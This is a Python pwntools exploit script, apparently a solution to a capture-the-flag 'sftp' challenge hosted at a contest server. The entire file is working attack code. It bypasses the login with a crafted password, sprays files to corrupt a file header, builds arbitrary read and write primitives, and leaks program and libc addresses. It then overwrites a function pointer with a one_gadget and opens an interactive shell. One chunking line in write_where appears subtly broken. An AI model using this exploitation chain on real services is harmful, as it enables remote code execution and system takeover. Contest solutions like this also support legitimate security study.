from __future__ import print_function

from pwn import *

def send_cmd(cmd):
    p.recvuntil("sftp> ")
    p.sendline(cmd)

def do_get(path):
    send_cmd("get " + path)
    l = int(p.recvline())
    return p.recvn(l)

def do_put(path, data):
    send_cmd("put " + path)
    p.sendline(str(len(data)))
    p.sendline(data)
    p.recvline() # Clobber the invalid command line

while True:
    try:
        if len(sys.argv) > 1 and sys.argv[1] == 'remote':
            p = remote("sftp.ctfcompetition.com", 1337 )
        else:
            p = process("./sftp")

        p.recvuntil("(yes/no)?")
        p.sendline("yes")
        p.recvuntil("password:")
        p.sendline("(AAAAA\x7e" + "\x80\x01\x01\x80\x01\x80\x80\x95")

        print("Authenticated")

        N_BIG = 100
        N_SMALL = 100
        bigfile_data = "-" * 65535

        for i in range(N_BIG):
            print("Made bigfile", i)
            do_put("bigfile{:06d}".format(i), bigfile_data)

        print("Made bigfiles")

        for i in range(N_SMALL):
            print("Made smallfile", i)
            do_put("smallfile{:06d}".format(i), "")

        print("Made smallfiles")

        for i in range(N_BIG):
            try:
                bigfile = "bigfile{:06d}".format(i)
                dat = do_get(bigfile)
                assert len(dat) == len(bigfile_data), "Data length is wrong"
                assert dat != bigfile_data, "Data unchanged"

                ind = dat.find("smallfile")
                assert ind != -1, "smallfile location not found"

                ind -= 12

                assert ind >= 0, "smallfile too close to start"
                assert ind + 8 + 4 + 20 + 8 + 8 <= len(bigfile_data), "smallfile too close to end"

                print("Header found:", repr(dat[ind:ind+12+20+8+8]))

                parent_directory = u64(dat[ind:ind+8])
                assert dat[ind+8:ind+12] == "\x02\x00\x00\x00", "Should be marked as a file"
                assert dat[ind+12:ind+12+9] == "smallfile", "File name wrong"
                smallfile = dat[ind+12:ind+12+9+6]

                print("Smallfile is", smallfile)
                print("Bigfile is", bigfile)

                size_loc = ind+12+20
                data_loc = ind+12+20+8

                break
            except Exception as e:
                print("Trial failed:", e)
        else:
            assert False, "All big_files failed"

        break
    except Exception as e:
        print("Trial failed:", e)
        p.close()
        continue

def prepare_file(ptr, size):
    new_dat = dat[:size_loc] + p64(size) + p64(ptr) + dat[data_loc+8:]
    assert len(new_dat) == len(dat)
    do_put(bigfile, new_dat)

def read_where(ptr, size):
    prepare_file(ptr, size)
    return do_get(smallfile)

def write_where(ptr, data):
    while len(data) > 65535:
        write_where(ptr, data[:65535])
        ptr += 65535
        data = data[:65535]
    prepare_file(ptr, len(data))
    do_put(smallfile, data)

if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
    gdb.attach(p, """
          set disassembly-flavor intel
           """)

# Example code
print("Parent directory pointer has", repr(read_where(parent_directory, 40)))
write_where(parent_directory + 12, "andrewhe")
print("Parent directory pointer has", repr(read_where(parent_directory, 40)))

# This is a BSS pointer
leak = read_where(parent_directory, 8)[:8]
leak = u64(leak)
print("parent directory leak", hex(leak))
codebase = leak - 0x208be0
print("codebase", hex(codebase))
strtok_got = 0x205018

libc_leak = read_where(codebase + strtok_got, 100)[8:16]
libc_leak = u64(libc_leak)
print("libc leak", hex(libc_leak))
libc_base = libc_leak - 0xa59d0
system = libc_base + 0x45390
one_gadget = libc_base + 0x4526a

# write to strcmp
write_where(codebase + 0x2050a0, p64(one_gadget))

send_cmd("/bin/sh")

p.interactive()
